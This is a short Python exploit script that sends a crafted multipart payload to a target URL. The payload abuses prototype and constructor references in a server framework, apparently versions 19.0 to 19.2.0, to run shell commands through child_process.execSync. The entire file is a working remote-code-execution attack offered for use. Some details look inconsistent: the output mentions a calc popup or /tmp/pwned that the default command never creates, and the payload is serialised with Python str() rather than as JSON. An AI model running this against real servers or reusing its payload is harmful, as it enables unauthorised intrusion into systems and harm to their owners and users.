#!/usr/bin/env python3

# Version: 19.0, 19.1.0, 19.1.1, and 19.2.0
# Tested on: Kali Linux 2025 / Python 3.11+

import requests
import sys


def exploit(target_url, command="mkdir xthemystik"):
    url = f"{target_url}/"

    # Craft the malicious payload for field "0"
    payload_0 = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B1337"}',
        "_response": {
            "_prefix": f"process.mainModule.require('child_process').execSync('{command}');",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }

    # Field "1" for chunk reference
    payload_1 = "$@0"

    files = {
        '0': (None, str(payload_0), 'application/json'),
        '1': (None, payload_1, 'text/plain')
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
    }

    try:
        response = requests.post(url, files=files, headers=headers)
        print(f"[+] Response Status: {response.status_code}")
        print(f"[+] Response Body: {response.text[:500]}...")  # Truncated for brevity
        print("[+] If vulnerable, the command should have executed (check for calc/xcalc popup or /tmp/pwned).")
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target_url>")
        sys.exit(1)
    exploit(sys.argv[1])